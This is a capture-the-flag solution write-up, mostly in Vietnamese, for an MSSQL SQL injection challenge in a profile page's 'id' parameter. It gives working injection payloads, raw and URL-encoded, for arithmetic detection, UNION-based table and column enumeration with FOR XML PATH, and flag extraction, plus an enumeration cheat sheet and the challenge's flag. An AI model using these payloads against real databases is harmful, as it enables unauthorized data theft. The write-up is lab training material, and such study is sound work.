# SQLi-003 Solution Writeup

## Vulnerability Analysis

Ứng dụng có lỗ hổng SQL Injection trong tham số `id` của trang profile.

### Vulnerable Code

```python
sql = f"SELECT * FROM employees WHERE id = {emp_id}"
```

Numeric parameter được concatenate trực tiếp, cho phép arithmetic injection.

---

## Step-by-Step Solution

### Step 1: Arithmetic Detection

**Test với phép chia 1:**

```
GET /profile?id=1/1
```

**Result:** Hiển thị profile của employee ID 1 (vì 1/1=1)

**Test với phép chia 0:**

```
GET /profile?id=1/0
```

**Result:** Error - "Divide by zero error encountered"

✅ **Confirmed**: Arithmetic operations được execute → SQLi vulnerable!

---

### Step 2: Confirm với phép trừ

```
GET /profile?id=2-1
```

**Result:** Hiển thị profile của employee ID 1 (vì 2-1=1)

```
GET /profile?id=3-1
```

**Result:** Hiển thị profile của employee ID 2

---

### Step 3: Xác định MSSQL

Từ error message:

```
[Microsoft][ODBC Driver 18 for SQL Server]
```

Hoặc test với MSSQL-specific syntax:

```
GET /profile?id=1; SELECT @@version--
```

---

### Step 4: UNION-based extraction

**4.1. Xác định số columns:**

```
GET /profile?id=1 UNION SELECT 'a','a',NULL,'a','a','a','a','a'--
```

✅ Success với 8 columns!

**4.2. Enumerate tables (MSSQL FOR XML PATH technique):**

**Lưu ý quan trọng:**

- Phải dùng **id=-1** (ID không tồn tại) để UNION query được hiển thị
- Column cuối cùng phải CAST về DATETIME để match với hire_date column

```
GET /profile?id=-1 UNION SELECT 1,(SELECT STUFF((SELECT ',' + table_name FROM information_schema.tables WHERE table_type='BASE TABLE' FOR XML PATH('')),1,1,'')),'test','test@test.com','IT','Engineer','555-0000',CAST('2024-01-01' AS DATETIME)--
```

**URL Encoded:**

```
GET /profile?id=-1%20UNION%20SELECT%201,(SELECT%20STUFF((SELECT%20','%20%2b%20table_name%20FROM%20information_schema.tables%20WHERE%20table_type%3d'BASE%20TABLE'%20FOR%20XML%20PATH('')),1,1,'')),'test','test@test.com','IT','Engineer','555-0000',CAST('2024-01-01'%20AS%20DATETIME)--
```

**Result:** Hiển thị `employees,flags` ở vị trí first_name

---

**4.3. Enumerate columns của bảng flags:**

```
GET /profile?id=-1 UNION SELECT 1,(SELECT STUFF((SELECT ',' + column_name FROM information_schema.columns WHERE table_name='flags' FOR XML PATH('')),1,1,'')),'test','test@test.com','IT','Engineer','555-0000',CAST('2024-01-01' AS DATETIME)--
```

**URL Encoded:**

```
GET /profile?id=-1%20UNION%20SELECT%201,(SELECT%20STUFF((SELECT%20','%20%2b%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name%3d'flags'%20FOR%20XML%20PATH('')),1,1,'')),'test','test@test.com','IT','Engineer','555-0000',CAST('2024-01-01'%20AS%20DATETIME)--
```

**Result:** `id,flag_name,flag_value`

---

**4.4. Extract flag:**

```
GET /profile?id=-1 UNION SELECT 1,(SELECT STUFF((SELECT ',' + flag_value FROM flags FOR XML PATH('')),1,1,'')),'test','test@test.com','IT','Engineer','555-0000',CAST('2024-01-01' AS DATETIME)--
```

**URL Encoded:**

```
GET /profile?id=-1%20UNION%20SELECT%201,(SELECT%20STUFF((SELECT%20','%20%2b%20flag_value%20FROM%20flags%20FOR%20XML%20PATH('')),1,1,'')),'test','test@test.com','IT','Engineer','555-0000',CAST('2024-01-01'%20AS%20DATETIME)--
```

---

## Final Payload

**Lấy tất cả flags trong 1 request:**

```
GET /profile?id=-1 UNION SELECT 1,(SELECT STUFF((SELECT ',' + flag_value FROM flags FOR XML PATH('')),1,1,'')),'test','test@test.com','IT','Engineer','555-0000',CAST('2024-01-01' AS DATETIME)--
```

**URL Encoded:**

```
/profile?id=-1%20UNION%20SELECT%201,(SELECT%20STUFF((SELECT%20','%20%2b%20flag_value%20FROM%20flags%20FOR%20XML%20PATH('')),1,1,'')),'test','test@test.com','IT','Engineer','555-0000',CAST('2024-01-01'%20AS%20DATETIME)--
```

---

## Flag

```
FLAG{4r1thm3t1c_d3t3ct10n_mssql_m4st3r}
```

---

## Key Learnings

1. **Arithmetic testing** rất hữu ích cho numeric parameters
2. **Division by zero** thường gây ra error rõ ràng
3. Nếu `2-1` trả về kết quả của ID 1 → arithmetic được execute
4. MSSQL có error messages rất detailed (giúp fingerprinting)
5. **Quan trọng:** Khi dùng UNION SQLi, phải match data types chính xác - dùng `CAST()` nếu cần
6. Dùng **id=-1** để không có kết quả gốc, chỉ hiển thị UNION query
7. **FOR XML PATH** + **STUFF** rất mạnh để concatenate nhiều rows thành 1 string

## MSSQL Specific Notes

| Feature          | MSSQL Syntax                   |
| ---------------- | ------------------------------ |
| Comments         | `--` (không cần space)         |
| Version          | `@@version`                    |
| Stacked queries  | Supported! (`;`)               |
| Top N rows       | `TOP N` thay vì `LIMIT`        |
| Concatenate rows | `FOR XML PATH('')` + `STUFF()` |
| Current DB       | `DB_NAME()`                    |

### MSSQL Enumeration Techniques

**1. List all user tables:**

```sql
-- Single row:
SELECT TOP 1 table_name FROM information_schema.tables WHERE table_type='BASE TABLE'

-- All rows concatenated:
SELECT STUFF((SELECT ',' + table_name FROM information_schema.tables WHERE table_type='BASE TABLE' FOR XML PATH('')),1,1,'')
```

**2. List columns of a table:**

```sql
SELECT STUFF((SELECT ',' + column_name FROM information_schema.columns WHERE table_name='YOUR_TABLE' FOR XML PATH('')),1,1,'')
```

**3. Extract data với nhiều rows:**

```sql
-- Dùng OFFSET/FETCH (MSSQL 2012+):
SELECT * FROM table ORDER BY id OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY
SELECT * FROM table ORDER BY id OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY
```
